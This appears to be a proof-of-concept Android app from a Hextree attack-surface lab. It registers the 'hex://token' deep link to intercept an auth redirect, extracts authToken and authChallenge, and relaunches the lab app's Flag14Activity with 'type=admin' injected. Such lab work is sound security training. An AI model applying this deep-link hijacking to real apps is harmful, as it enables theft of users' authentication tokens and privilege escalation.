    // register intent-filter
    <activity
            android:name=".Deeplinkpoc"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE" />

                <data
                    android:scheme="hex"
                    android:host="token"/>
            </intent-filter>
        </activity>


    // Deeplinkpoc class 
    public class Deeplinkpoc extends AppCompatActivity {

        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            EdgeToEdge.enable(this);
            setContentView(R.layout.activity_deeplinkpoc);
            ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
                Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
                v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
                return insets;
            });
            Uri data = getIntent().getData();
            // to trace 
            // Log.d("Parameters", data.toString());
            String authToken = data.getQueryParameter("authToken");
            String authChallenge = data.getQueryParameter("authChallenge");
            Intent intent = new Intent("android.intent.action.VIEW");
            intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag14Activity");
            intent.setData(Uri.parse("hex://token?type=admin&" +"authToken=" + authToken +"&authChallenge=" + authChallenge));
            startActivity(intent);
        }
    }